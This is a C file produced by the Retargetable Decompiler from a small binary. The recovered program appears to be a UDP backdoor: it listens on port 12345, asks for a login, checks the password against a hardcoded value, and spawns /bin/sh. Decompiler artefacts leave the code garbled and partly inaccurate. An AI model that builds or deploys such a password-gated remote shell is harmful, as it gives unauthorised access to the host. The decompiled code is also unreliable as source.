//
// This file was generated by the Retargetable Decompiler
// Website: https://retdec.com
// Copyright (c) 2016 Retargetable Decompiler <info@retdec.com>
//

#include <netinet/in.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

// ------------------------ Structures ------------------------

struct _IO_FILE {
    int32_t e0;
};

struct sockaddr {
    int32_t e0;
    char e1[14];
};

// ------------------- Function Prototypes --------------------

int32_t die(int32_t str);

// --------------------- Global Variables ---------------------

struct _IO_FILE * g1 = NULL; // 0x8049180

// ------------------------ Functions -------------------------

// Address range: 0x804885b - 0x8048899
int32_t die(int32_t str) {
    // 0x804885b
    puts((char *)str);
    fflush(g1);
    perror("Error printed by perror");
    exit(1);
    // UNREACHABLE
}

// Address range: 0x804889a - 0x8048dbf
int main(int argc, char ** argv) {
    int32_t fds[2]; // 0x8048c55
    // create internet udp socket
    uint32_t sock_fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP); // 0x80488b8
    if (sock_fd <= 0) {
        // 0x80488c9
        die((int32_t)"can't create socket");
        // branch -> 0x80488d9
    }
    // 0x80488d9
    int32_t addr;
    memset((char *)&addr, 0, 16);
    addr = 2;
    htons(0x3039); // 12345
    htonl(0);
    int32_t addr_len = 16;
    if (bind(sock_fd, (struct sockaddr *)&addr, 16) <= 0) {
        // 0x804893a
        die((int32_t)"can't bind");
        // branch -> 0x804894a
    }
    // 0x804894a
    int32_t fd;
    fds[0] = &fd;
    int32_t v1;
    char v2 = v1;
    int32_t v3;
    char v4 = v3;
    // branch -> 0x804894a
  block_1:;
    char v5;
    int32_t str2;
    int32_t str;
    int32_t addr2;
    while (true) {
        char v6 = v2;
        // branch -> 0x804894a
      block_2:
        while (true) {
            // 0x804894a
            int32_t buf;
            memset((char *)&buf, 0, 20);
            memset((char *)&str2, 0, 20);
            memset((char *)&str, 0, 2000);
            str2 = 0x6d397036; //m9p6
            // branch -> 0x804894a
            while (recvfrom(sock_fd, (char *)&buf, 2000, 0, (struct sockaddr *)&addr2, &addr_len) <= 0) {
                // 0x804894a
                memset((char *)&buf, 0, 20);
                memset((char *)&str2, 0, 20);
                memset((char *)&str, 0, 2000);
                str2 = 0x6d397036; //m9p6
                // continue -> 0x804894a
            }
            // 0x80489cc
            strlen((char *)&buf);
            v5 = v6;
            if (v6 == 10) {
                // 0x80489e7
                strlen((char *)&buf);
                v5 = 0;
                // branch -> 0x80489fe
            }
            // 0x80489fe
            sprintf((char *)&str, "your login is: \"%s\". Now give me your password\n", &buf);
            int32_t len = strlen((char *)&str); // 0x8048a26
            int32_t v7 = sendto(sock_fd, (char *)&str, len, 0, (struct sockaddr *)&addr2, addr_len); // 0x8048a45
            if (v7 > 0) {
                // break -> 0x8048a5b
                break;
            }
            v6 = v5;
            // continue -> 0x804894a
        }
        // 0x8048a5b
        memset((char *)&str, 0, 2000);
        int32_t v8 = recvfrom(sock_fd, (char *)&str, 2000, 0, (struct sockaddr *)&addr2, &addr_len); // 0x8048a90
        if (v8 > 0) {
            // break (via goto) -> 0x8048aa6
            goto block_3;
        }
        v6 = v5;
        // continue (via goto) -> 0x804894a
        goto block_2;
    }
  block_3:
    // 0x8048aa6
    strlen((char *)&str);
    char v9 = v4;
    if (v4 == 10) {
        // 0x8048ac7
        strlen((char *)&str);
        v9 = 0;
        // branch -> 0x8048ae4
    }
    int32_t strcmp_rc = strcmp((char *)&str2, (char *)&str); // 0x8048af9
    str = strcmp_rc == 0 ? 0x636c6577 : 0x74746562; //clew : tteb
    int32_t len2 = strlen((char *)&str); // 0x8048bb0
    sendto(sock_fd, (char *)&str, len2, 0, (struct sockaddr *)&addr2, addr_len);
    if (strcmp_rc == 0) {
        // break (via goto) -> 0x8048be5
        goto block_4;
    }
    v2 = v5;
    v4 = v9;
    // continue (via goto) -> 0x804894a
    goto block_1;
  block_4:
    // 0x8048be5
    memset((char *)&str, 0, 2000);
    int32_t v10 = recvfrom(sock_fd, (char *)&str, 2000, 0, (struct sockaddr *)&addr2, &addr_len); // 0x8048c1a
    if (v10 > 0) {
        // break (via goto) -> 0x8048c30
        goto block_5;
    }
    v2 = v5;
    v4 = v9;
    // continue (via goto) -> 0x804894a
    goto block_1;
  block_5:
    // 0x8048c30
    fd = 0;
    pipe(fds);
    int32_t pid = fork(); // 0x8048c5d
    if (pid == 0) {
        // 0x8048c6b
        close(fd);
        dup2(0, 1);
        dup2(0, 2);
        execl("/bin/sh", "sh");
        // branch -> 0x8048cc8
    }
    // 0x8048cc8
    sleep(2);
    kill(pid, SIGKILL);
    close(0);
    struct _IO_FILE * stream = fdopen(fd, "r"); // 0x8048d06
    memset((char *)&str, 0, 2000);
    if (stream == NULL) {
        // 0x8048d30
        str = 0x6c696166;
        // branch -> 0x8048d7d
    } else {
        // 0x8048d64
        fread((char *)&str, 1, 1999, stream);
        // branch -> 0x8048d7d
    }
    int32_t len3 = strlen((char *)&str); // 0x8048d8a
    sendto(sock_fd, (char *)&str, len3, 0, (struct sockaddr *)&addr2, addr_len);
    v2 = v5;
    v4 = v9;
    // branch -> 0x804894a
    goto block_1;
}

// --------------- Dynamically Linked Functions ---------------

// int bind(int fd, __CONST_SOCKADDR_ARG addr, socklen_t len);
// int close(int fd);
// int dup2(int fd, int fd2);
// int execl(const char * path, const char * arg, ...);
// void exit(int status);
// FILE * fdopen(int fd, const char * modes);
// int fflush(FILE * stream);
// __pid_t fork(void);
// size_t fread(void * restrict ptr, size_t size, size_t n, FILE * restrict stream);
// uint32_t htonl(uint32_t hostlong);
// uint16_t htons(uint16_t hostshort);
// int kill(__pid_t pid, int sig);
// void * memset(void * s, int c, size_t n);
// void perror(const char * s);
// int pipe(int pipedes[2]);
// int puts(const char * s);
// ssize_t recvfrom(int fd, void * restrict buf, size_t n, int flags, __SOCKADDR_ARG addr, socklen_t * restrict addr_len);
// ssize_t sendto(int fd, const void * buf, size_t n, int flags, __CONST_SOCKADDR_ARG addr, socklen_t addr_len);
// unsigned int sleep(unsigned int seconds);
// int socket(int domain, int type, int protocol);
// int sprintf(char * restrict s, const char * restrict format, ...);
// int strcmp(const char * s1, const char * s2);
// size_t strlen(const char * s);

// --------------------- Meta-Information ---------------------

// Detected compiler/packer: gcc (4.9.2)
// Detected functions: 2
// Decompiler release: v2.2.1 (2016-09-07)
// Decompilation date: 2016-12-04 11:55:30
